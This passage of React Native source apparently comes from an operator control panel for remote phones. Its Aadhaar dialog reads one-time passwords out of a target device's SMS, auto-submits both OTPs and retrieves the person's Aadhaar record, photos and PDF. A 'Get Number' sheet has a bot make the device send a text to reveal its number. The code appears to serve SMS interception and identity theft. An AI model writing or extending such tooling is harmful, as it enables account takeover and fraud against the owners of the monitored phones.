        keyboardType="number-pad"
        maxLength={6}
        style={[s.input, { textAlign: 'center', letterSpacing: 6, fontSize: 22, fontFamily: 'Inter_700Bold', marginTop: 14 }]}
        testID="otp-confirm-input"
      />
      {error ? <Text style={[s.sub, { color: PALETTE.red }]}>{error}</Text> : null}
      {onResend ? (
        <Pressable onPress={onResend} style={({ pressed }) => [{ alignSelf: 'center', marginTop: 8 }, pressed && { opacity: 0.7 }]} testID="otp-resend">
          <Text style={[s.sub, { color: '#52a9ff' }]}>OTP nahi aaya? Resend</Text>
        </Pressable>
      ) : null}
      {onSkipChange ? (
        <CheckRow label="Don't ask OTP again for 2 hours" checked={!!skip} onToggle={() => onSkipChange(!skip)} testID="otp-skip" />
      ) : null}
      <View style={s.btnRow}>
        <View style={{ flex: 1 }}><OutlineButton label="Cancel" onPress={onClose} testID="otp-confirm-cancel" /></View>
        <View style={{ flex: 1 }}>
          <GradientButton label={actionLabel} disabled={code.length < 6} onPress={() => onConfirm(code)} testID="otp-confirm-ok" />
        </View>
      </View>
    </PanelModal>
  );
}

/* ---------- Aadhaar — API flow: phone → OTP1 → OTP2 → result (save to Notes) ---------- */

type AadhaarStep = 'number' | 'otp1' | 'otp2' | 'done';

export function AadhaarDialog({
  visible, onClose, phone, deviceId, messages, onSaved,
}: {
  visible: boolean; onClose: () => void; phone: string; deviceId?: string;
  messages?: { id: string; from: string; body: string; time: string; type: string }[];
  onSaved: (result: AadhaarResult) => void;
}) {
  const [step, setStep] = useState<AadhaarStep>('number');
  const [input, setInput] = useState(phone || '');
  const [busy, setBusy] = useState(false);
  const [autoScan, setAutoScan] = useState(false); // device SMS se OTP dhund rahe hain
  const [error, setError] = useState('');
  const [result, setResult] = useState<AadhaarResult | null>(null);
  const ranFor = useRef<AadhaarStep | null>(null); // har OTP step pe ek baar hi auto-run

  // Dialog khulte hi step 0 se shuru + input me device ka phone prefilled hota hai.
  useEffect(() => {
    if (visible) {
      setStep('number');
      setInput(phone || '');
      setError('');
      setResult(null);
      ranFor.current = null;
    }
  }, [visible, phone]);

  const sendInit = async () => {
    setBusy(true); setError('');
    const r = await aadhaarInit(input);
    setBusy(false);
    if (!r.ok) { setError(r.error); return; }
    setStep('otp1'); setInput('');
  };

  // OTP auto-pick karne ke liye (device SMS se) ek pustak-style helper
  const tryAutoOtp = async (next: 'otp1' | 'otp2') => {
    if (!deviceId) return false;
    setAutoScan(true); setError('');
    const r = await getOtpFromDeviceSms(deviceId, messages ?? []);
    setAutoScan(false);
    if (!r.ok) { setError(r.error); return false; }
    setInput(r.otp);
    // mila to turant submit + aage le chalo (auto-redirect)
    if (next === 'otp1') {
      const sub = await aadhaarSubmitOtp1(r.otp);
      if (!sub.ok) { setError(sub.error); return false; }
      ranFor.current = 'otp1';
      setStep('otp2'); setInput('');
      return true;
    }
    const sub = await aadhaarSubmitOtp2(r.otp);
    if (!sub.ok) { setError(sub.error); return false; }
    ranFor.current = 'otp2';
    setResult(sub.result);
    setStep('done');
    return true;
  };

  const sendOtp1 = async () => {
    setBusy(true); setError('');
    const r = await aadhaarSubmitOtp1(input.trim());
    setBusy(false);
    if (!r.ok) { setError(r.error); return; }
    ranFor.current = 'otp1';
    setStep('otp2'); setInput('');
  };

  const sendOtp2 = async () => {
    setBusy(true); setError('');
    const r = await aadhaarSubmitOtp2(input.trim());
    setBusy(false);
    if (!r.ok) { setError(r.error); return; }
    ranFor.current = 'otp2';
    setResult(r.result);
    setStep('done');
  };

  // OTP step pe pahunchte hi device SMS se OTP auto-pick karo (bas ek baar per step)
  useEffect(() => {
    if (!visible) return;
    if (step === 'otp1' && ranFor.current !== 'otp1') tryAutoOtp('otp1');
    else if (step === 'otp2' && ranFor.current !== 'otp2') tryAutoOtp('otp2');
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, visible]);

  const title = step === 'number' ? '📇 Get Aadhaar' : step === 'otp1' ? '🔐 Enter OTP (1/2)' : step === 'otp2' ? '🔐 Enter OTP (2/2)' : '✅ Aadhaar Ready';

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title={title} />
      {step === 'number' && (
        <>
          <Text style={s.aadhaarHint}>API number maangta hai — device ka linked phone number:</Text>
          <TextInput value={input} onChangeText={setInput} keyboardType="phone-pad" placeholder="+91 98115 20001" placeholderTextColor={PALETTE.textDim} style={[s.input, { marginTop: 12 }]} testID="aadhaar-phone" />
        </>
      )}
      {(step === 'otp1' || step === 'otp2') && (
        <>
          <View style={[s.autoOtpRow, (autoScan || input) && s.autoOtpRowActive]}>
            <ActivityIndicator color={PALETTE.teal} size="small" />
            <Text style={s.autoOtpText}>
              {autoScan
                ? `${step === 'otp1' ? 'Pehla' : 'Doosra'} OTP device ki SMS se nikal raha hai…`
                : input
                ? `OTP device se mila chuka hai — auto submit ho raha hai (${input})`
                : `${step === 'otp1' ? 'Pehla' : 'Doosra'} OTP dhundte hain device ki SMS me…`}
            </Text>
          </View>
          <TextInput
            value={input}
            onChangeText={setInput}
            keyboardType="number-pad"
            placeholder="agar auto mil na paya, yahan manual daal sakte ho"
            placeholderTextColor={PALETTE.textDim}
            editable={!autoScan}
            style={[s.input, { marginTop: 12 }]}
            testID={step === 'otp1' ? 'aadhaar-otp1' : 'aadhaar-otp2'}
          />
        </>
      )}

      {error ? <Text style={s.aadhaarError}>{error}</Text> : null}

      {step !== 'done' && (
        <View style={{ marginTop: 16 }}>
          {busy ? (
            <View style={s.aadhaarBusy}><ActivityIndicator color={PALETTE.primaryBright} size="small" /></View>
          ) : (
            <GradientButton
              label={step === 'number' ? 'Send Number' : step === 'otp1' ? 'Verify OTP 1' : 'Verify OTP 2'}
              onPress={step === 'number' ? sendInit : step === 'otp1' ? sendOtp1 : sendOtp2}
              disabled={!input.trim()}
              testID={step === 'number' ? 'aadhaar-send-number' : step === 'otp1' ? 'aadhaar-send-otp1' : 'aadhaar-send-otp2'}
            />
          )}
        </View>
      )}

      {step === 'done' && result && (
        <ScrollView style={{ maxHeight: 380 }}>
          <Text style={s.aadhaarText}>{result.text}</Text>
          <View style={s.aadhaarPhotos}>
            {result.photos.map((p) => (
              <View key={p.label} style={s.aadhaarPhotoBox}>
                {p.uri ? <Image source={{ uri: p.uri }} style={s.aadhaarPhotoImg} /> : <Feather name="image" size={28} color={PALETTE.textDim} />}
                <Text style={s.aadhaarPhotoLabel} numberOfLines={1}>{p.label}</Text>
              </View>
            ))}
          </View>
          <View style={s.aadhaarPdfRow}>
            <Feather name="file-text" size={15} color={PALETTE.red} />
            <Text style={s.aadhaarPdfName} numberOfLines={1}>{result.pdfName}</Text>
          </View>
          <GradientButton label="Save to Notes" onPress={() => onSaved(result)} testID="aadhaar-save" style={{ marginTop: 16 }} />
        </ScrollView>
      )}
    </PanelModal>
  );
}

/* ---------- Get Number — device ka number unknown ho to pata karna ---------- */

export function GetNumberDialog({
  visible, onClose, deviceId, knownNumber, onGot,
}: {
  visible: boolean; onClose: () => void; deviceId: string; knownNumber: string;
  onGot: (number: string) => void;
}) {
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState('');
  const [result, setResult] = useState<string | null>(null);

  useEffect(() => {
    if (visible) { setBusy(false); setError(''); setResult(null); }
  }, [visible]);

  const fetchNumber = async () => {
    setBusy(true); setError('');
    const r = await getDeviceNumber(deviceId, knownNumber === 'N/A' ? undefined : knownNumber);
    setBusy(false);
    if (!r.ok) { setError(r.error); return; }
    setResult(r.result.number);
  };

  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title="🔢 Get Number" sub={`Device — ${deviceId}`} />
      <Text style={s.aadhaarHint}>
        {knownNumber === 'N/A'
          ? 'Device ka number unknown hai. Bot device pe ek text bhijwayega, wahi API number return karega.'
          : `Current number: ${knownNumber}\n\nMatlab ye hai — device apna current number send karega, API usse recognize karke verify karega.`}
      </Text>
      {error ? <Text style={s.aadhaarError}>{error}</Text> : null}
      {result ? (
        <View style={s.getNumResult}>
          <Feather name="check-circle" size={18} color={PALETTE.green} />
          <Text style={s.getNumResultText}>{result}</Text>
        </View>
      ) : null}
      <View style={{ marginTop: 16 }}>
        {busy ? (
          <View style={s.aadhaarBusy}><ActivityIndicator color={PALETTE.primaryBright} size="small" /></View>
        ) : result ? (
          <GradientButton label="Use This Number" onPress={() => onGot(result)} testID="getnum-use" />
        ) : (
          <GradientButton label="Get Number" onPress={fetchNumber} testID="getnum-fetch" />
        )}
      </View>
    </PanelModal>
  );
}

/* ---------- Get Number — bottom sheet (slide up + drag handle + slide down close) ---------- */

const SHEET_MAX = Math.round(Dimensions.get('window').height * 0.68);
const SHEET_DRAG_CLOSE = 120; // px, handle neeche itna kheecho to close
const SHEET_STYLE_ID = 0;

export function GetNumberSheet({
  visible, onClose, deviceId, knownNumber, onGot,
}: {
  visible: boolean; onClose: () => void; deviceId: string; knownNumber: string;
  onGot: (number: string) => void;
}) {
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState('');
  const [result, setResult] = useState<string | null>(null);

  // Slide animation — content apni hi height se neeche shuru, kholne pe upar
  const openY = useRef(new Animated.Value(0)).current; // 0 = open (settled)
  const hasOpened = useRef(false);

  // visible hoti hai to sheet ko upar lao; band hoti hai to reset
  useEffect(() => {
    if (visible) {
      setBusy(false); setError('');
      // Owner rule (2026-08-15): number pehle se pata hai to WOHl dikhao —
      // device se tabhi fetch karo jab number showing nahi hai (N/A).
      setResult(knownNumber !== 'N/A' ? knownNumber : null);
      hasOpened.current = true;
      Animated.spring(openY, { toValue: 0, useNativeDriver: true, damping: 20, stiffness: 260 }).start();
    } else {
      openY.setValue(0);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [visible]);

  const close = () => {
    Animated.timing(openY, { toValue: SHEET_MAX, duration: 220, useNativeDriver: true }).start(() => onClose());
  };

  const pan = useRef(
    PanResponder.create({
      onMoveShouldSetPanResponder: (_, g) => Math.abs(g.dy) > 4 && Math.abs(g.dy) > Math.abs(g.dx),
      onPanResponderMove: (_, g) => {
        if (g.dy > 0) openY.setValue(g.dy); // neeche hi kheinch sakte ho
      },
      onPanResponderRelease: (_, g) => {
        if (g.dy > SHEET_DRAG_CLOSE || g.vy > 0.7) close();
        else Animated.spring(openY, { toValue: 0, useNativeDriver: true, damping: 24, stiffness: 320 }).start();
      },
    }),
  ).current;

  const fetchNumber = async () => {
    setBusy(true); setError('');
    const r = await getDeviceNumber(deviceId, knownNumber === 'N/A' ? undefined : knownNumber);
    setBusy(false);
    if (!r.ok) { setError(r.error); return; }
    setResult(r.result.number);
  };

  return (
    <Modal visible={visible} transparent animationType="fade" onRequestClose={close} statusBarTranslucent>
      <View style={[s.sheetRoot, { backgroundColor: openY.interpolate({ inputRange: [0, SHEET_MAX], outputRange: ['rgba(2,6,17,0.0)', 'rgba(2,6,17,0.55)'] }) as unknown as string }]}>
        {/* Backdrop — upar (sheet ke bahar) pe tap to close */}
        <Pressable style={StyleSheet.absoluteFill} onPress={close} testID="getnum-backdrop" />
      </View>

      <View style={StyleSheet.absoluteFill} pointerEvents="box-none">
        <Animated.View style={[s.sheet, { transform: [{ translateY: openY }] }]}>
          {/* Drag handle — slide bar */}
          <View style={s.sheetBarWrap} {...pan.panHandlers}>
            <View style={s.sheetBar} testID="getnum-handle" />
          </View>

          <View style={s.sheetHead}>
            <Text style={s.sheetTitle}>🔢 Get Number</Text>
            <Text style={s.sheetSub}>Device — {deviceId}</Text>
          </View>

          <View style={s.sheetBody}>
            <View style={s.getNumCard}>
              <Text style={s.getNumLabel}>CURRENT NUMBER</Text>
              <Text style={s.getNumValue} numberOfLines={1}>{knownNumber === 'N/A' ? 'Unknown — pata karna hai' : knownNumber}</Text>
            </View>

            <Text style={s.getNumHint}>
              {knownNumber === 'N/A'
                ? 'Device pe bot ek text bhijwayega, aur number ye return hoga.'
                : 'Device apna current number send karega, API usse recognize karke verify karega.'}
            </Text>

            {error ? <Text style={s.getNumError}>{error}</Text> : null}
            {result ? (
              <View style={s.getNumResultRow}>
                <Feather name="check-circle" size={18} color={PALETTE.green} />
                <Text style={s.getNumResultText}>{result}</Text>
              </View>
            ) : null}

            <View style={{ marginTop: 16 }}>
              {busy ? (
                <View style={s.getNumBusy}><ActivityIndicator color={PALETTE.primaryBright} size="small" /></View>
              ) : result ? (
                <GradientButton label="✓ Use This Number" onPress={() => onGot(result)} testID="getnum-use" />
              ) : (
                <GradientButton label="🔎 Get Number" onPress={fetchNumber} testID="getnum-fetch" />
              )}
            </View>
          </View>
        </Animated.View>
      </View>
    </Modal>
  );
}

/* ---------- custom_dialog.xml ---------- */

export function ConfirmDialog({
  visible, onClose, title, message, onOk, okLabel = ' Ok ',
}: {
  visible: boolean; onClose: () => void; title: string; message: string; onOk: () => void; okLabel?: string;
}) {
  // NOTE: onOk is responsible for what happens next (close or chain into
  // another dialog) — we do NOT auto-close here, or a chained dialog's
  // visible state would be overwritten immediately.
  return (
    <PanelModal visible={visible} onClose={onClose}>
      <DialogTitle title={title} />
      <Text style={s.broadcastBody}>{message}</Text>
      <View style={s.btnRow}>
        <View style={{ flex: 1 }}><OutlineButton label="Cancel" onPress={onClose} testID="confirm-cancel" /></View>
        <View style={{ flex: 1 }}><GradientButton label={okLabel} onPress={onOk} testID="confirm-ok" /></View>
      </View>
    </PanelModal>
  );
}

const s = StyleSheet.create({
  title: { color: PALETTE.text, fontSize: 18, fontFamily: 'Inter_700Bold' },
  sub: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_400Regular', marginTop: 4 },
  checkRow: { flexDirection: 'row', alignItems: 'center', gap: 10, paddingVertical: 6 },
  checkbox: { width: 20, height: 20, borderRadius: 5, borderWidth: 1.5, borderColor: PALETTE.fieldBorder, alignItems: 'center', justifyContent: 'center' },
  checkboxOn: { backgroundColor: PALETTE.primary, borderColor: PALETTE.primary },
  checkLabel: { color: PALETTE.text, fontSize: 15, fontFamily: 'Inter_500Medium' },
  toggleInfo: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_400Regular', marginTop: 6, lineHeight: 16 },
  btnRow: { flexDirection: 'row', alignItems: 'center', gap: 12, marginTop: 16 },
  menuRow: { flexDirection: 'row', alignItems: 'center', gap: 12, paddingVertical: 14, paddingHorizontal: 14, backgroundColor: PALETTE.bg, borderRadius: 12 },
  menuRowHero: { backgroundColor: 'rgba(16,185,129,0.10)', borderWidth: 1, borderColor: PALETTE.teal },
  menuEmoji: { fontSize: 20, width: 32, textAlign: 'center' },
  menuEmojiHero: { fontSize: 22 },
  menuGap: { height: 10 },
  menuLabel: { color: PALETTE.text, fontSize: 15, fontFamily: 'Inter_700Bold' },
  menuSub: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_400Regular' },
  divider: { height: 1, backgroundColor: PALETTE.fieldBorder },
  input: {
    backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 12,
    paddingHorizontal: 12, paddingVertical: 12, color: PALETTE.text, fontSize: 14, fontFamily: 'Inter_400Regular',
  },
  inputRow: { flexDirection: 'row', alignItems: 'center', gap: 8 },
  fieldLabel: { color: PALETTE.textCbd, fontSize: 12, fontFamily: 'Inter_700Bold' },
  quickFillTitle: { color: PALETTE.textCbd, fontSize: 12, fontFamily: 'Inter_700Bold', marginTop: 14 },
  chipRowWrap: { marginTop: 8, gap: 6 },
  chipRow: { flexDirection: 'row', gap: 8 },
  chip: { flex: 1, backgroundColor: PALETTE.cardAlt, borderWidth: 1, borderColor: PALETTE.borderSoft, borderRadius: 12, paddingHorizontal: 10, paddingVertical: 8, alignItems: 'center' },
  chipText: { color: PALETTE.text, fontSize: 11, fontFamily: 'Inter_400Regular' },
  toggleRow: { flexDirection: 'row', alignItems: 'center', marginTop: 8, gap: 10 },
  statusAmber: { color: PALETTE.amber, fontSize: 13, fontFamily: 'Inter_700Bold' },
  simChipInline: { backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 10, paddingHorizontal: 12, paddingVertical: 10, marginTop: 8 },
  simChipText: { color: PALETTE.textSoft, fontSize: 13, fontFamily: 'Inter_600SemiBold' },
  toggleSection: { flexDirection: 'row', alignItems: 'center', backgroundColor: PALETTE.bg, padding: 12, marginTop: 16, gap: 10 },
  loadPct: { color: PALETTE.textMuted, fontSize: 14, fontFamily: 'Inter_400Regular' },
  track: { height: 6, borderRadius: 3, backgroundColor: PALETTE.border, overflow: 'hidden', marginTop: 12 },
  fill: { height: '100%', backgroundColor: PALETTE.primaryBright, borderRadius: 3 },
  broadcastHead: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', marginBottom: 12 },
  broadcastBody: { color: PALETTE.textCbd, fontSize: 14, fontFamily: 'Inter_400Regular', lineHeight: 21 },
  sessionRow: {
    flexDirection: 'row', alignItems: 'center', gap: 10, backgroundColor: PALETTE.bg,
    borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 12, padding: 12, marginBottom: 8,
  },
  sessionDevice: { color: PALETTE.text, fontSize: 14, fontFamily: 'Inter_700Bold' },
  sessionMeta: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_400Regular', marginTop: 2 },
  logoutBtn: { borderRadius: 8, paddingHorizontal: 12, paddingVertical: 8 },
  logoutText: { color: '#ffffff', fontSize: 12, fontFamily: 'Inter_600SemiBold' },
  noteList: { maxHeight: 220 },
  allSmsRow: {
    backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder,
    borderRadius: 12, padding: 10, marginBottom: 8,
  },
  allSmsHead: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', gap: 8, marginBottom: 4 },
  allSmsDevice: { flex: 1, color: PALETTE.primaryBright, fontSize: 11, fontFamily: 'Inter_700Bold' },
  allSmsTime: { color: PALETTE.textFaint, fontSize: 9, fontFamily: 'Inter_400Regular' },
  allSmsFrom: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_600SemiBold', marginBottom: 2 },
  allSmsBody: { color: PALETTE.text, fontSize: 12, fontFamily: 'Inter_400Regular', lineHeight: 17 },
  noteRow: {
    flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: PALETTE.bg,
    borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 12, padding: 12, marginBottom: 8,
  },
  noteBody: { color: PALETTE.text, fontSize: 13, fontFamily: 'Inter_500Medium', lineHeight: 18 },
  noteTime: { color: PALETTE.textFaint, fontSize: 10, fontFamily: 'Inter_400Regular', marginTop: 4 },
  noteEmpty: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_400Regular', textAlign: 'center', paddingVertical: 16 },
  noteInput: { marginTop: 14, minHeight: 70, textAlignVertical: 'top' },
  avSection: { backgroundColor: 'rgba(0,0,0,0.25)', borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 10, padding: 12, marginBottom: 12 },
  avSectionTitle: { color: PALETTE.primaryBright, fontSize: 12, fontFamily: 'Inter_700Bold', letterSpacing: 1, marginBottom: 8 },
  avMini: { color: PALETTE.textMuted, fontSize: 9, fontFamily: 'Inter_700Bold', letterSpacing: 1, marginBottom: 6 },
  avChipWrap: { flexDirection: 'row', flexWrap: 'wrap', gap: 6, marginBottom: 10 },
  avChip: {
    flexDirection: 'row', alignItems: 'center', gap: 4, backgroundColor: PALETTE.cardAlt,
    borderWidth: 1, borderColor: PALETTE.borderSoft, borderRadius: 6, paddingHorizontal: 8, paddingVertical: 4,
  },
  avChipText: { color: PALETTE.textSoft, fontSize: 10, fontFamily: 'Inter_400Regular' },
  avResult: { backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 8, padding: 10 },
  avResultText: { color: PALETTE.text, fontSize: 12, fontFamily: 'Inter_400Regular', lineHeight: 17 },
  aadhaarHint: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_400Regular', lineHeight: 18 },
  aadhaarError: { color: PALETTE.red, fontSize: 12, fontFamily: 'Inter_400Regular', marginTop: 10 },
  aadhaarText: { color: PALETTE.text, fontSize: 13, fontFamily: 'Inter_500Medium', lineHeight: 20 },
  aadhaarPhotos: { flexDirection: 'row', gap: 10, marginTop: 14 },
  aadhaarPhotoBox: { flex: 1, backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 12, alignItems: 'center', paddingVertical: 14, gap: 6 },
  aadhaarPhotoImg: { width: 60, height: 60, borderRadius: 8 },
  aadhaarPhotoLabel: { color: PALETTE.textMuted, fontSize: 10, fontFamily: 'Inter_400Regular', paddingHorizontal: 6 },
  aadhaarPdfRow: { flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 10, padding: 12, marginTop: 14 },
  aadhaarPdfName: { flex: 1, color: PALETTE.text, fontSize: 12, fontFamily: 'Inter_600SemiBold' },
  aadhaarBusy: { alignItems: 'center', paddingVertical: 10 },
  geSub: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_400Regular', lineHeight: 16, marginBottom: 8 },
  geSummary: { flexDirection: 'row', gap: 14, marginBottom: 8 },
  geSummaryText: { fontSize: 12, fontFamily: 'Inter_700Bold' },
  geList: { maxHeight: 320 },
  geRow: { flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 10, padding: 10, marginBottom: 8 },
  geDot: { fontSize: 10 },
  geRowTitle: { color: PALETTE.text, fontSize: 12, fontFamily: 'Inter_700Bold' },
  geRowSub: { color: PALETTE.textMuted, fontSize: 11, fontFamily: 'Inter_400Regular', marginTop: 2, lineHeight: 15 },
  geEmpty: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_400Regular', textAlign: 'center', paddingVertical: 18 },
  geBusy: { alignItems: 'center', paddingVertical: 12 },
  autoOtpRow: {
    flexDirection: 'row', alignItems: 'center', gap: 8,
    backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder,
    borderRadius: 12, padding: 12, marginTop: 4,
  },
  autoOtpRowActive: { borderColor: PALETTE.teal },
  autoOtpText: { flex: 1, color: PALETTE.textCbd, fontSize: 12, fontFamily: 'Inter_500Medium', lineHeight: 17 },
  getNumResult: { flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.green, borderRadius: 12, padding: 12, marginTop: 14 },
  getNumResultText: { flex: 1, color: PALETTE.green, fontSize: 15, fontFamily: 'Inter_700Bold' },

  // Get Number bottom sheet
  sheetRoot: { flex: 1 } as object,
  sheet: {
    position: 'absolute', left: 0, right: 0, bottom: 0,
    maxHeight: SHEET_MAX,
    backgroundColor: PALETTE.card,
    borderTopLeftRadius: 22, borderTopRightRadius: 22,
    borderWidth: 1, borderColor: PALETTE.borderSoft, borderBottomWidth: 0,
    paddingTop: 8, paddingBottom: 26,
  },
  sheetBarWrap: { alignSelf: 'center', paddingVertical: 8, paddingHorizontal: 40 },
  sheetBar: { width: 44, height: 5, borderRadius: 3, backgroundColor: PALETTE.fieldBorder },
  sheetHead: { paddingHorizontal: 18, paddingBottom: 12, borderBottomWidth: 1, borderBottomColor: PALETTE.borderSoft },
  sheetTitle: { color: PALETTE.text, fontSize: 17, fontFamily: 'Inter_700Bold' },
  sheetSub: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_400Regular', marginTop: 3 },
  sheetBody: { paddingHorizontal: 18, paddingTop: 14 },
  getNumCard: { backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.fieldBorder, borderRadius: 14, padding: 14 },
  getNumLabel: { color: PALETTE.textFaint, fontSize: 10, fontFamily: 'Inter_700Bold', letterSpacing: 1.2 },
  getNumValue: { color: PALETTE.text, fontSize: 18, fontFamily: 'Inter_700Bold', marginTop: 6 },
  getNumHint: { color: PALETTE.textMuted, fontSize: 12, fontFamily: 'Inter_400Regular', lineHeight: 18, marginTop: 12 },
  getNumError: { color: PALETTE.red, fontSize: 12, fontFamily: 'Inter_400Regular', marginTop: 10 },
  getNumResultRow: { flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: PALETTE.bg, borderWidth: 1, borderColor: PALETTE.green, borderRadius: 12, padding: 12, marginTop: 14 },
  getNumBusy: { alignItems: 'center', paddingVertical: 10 },
});
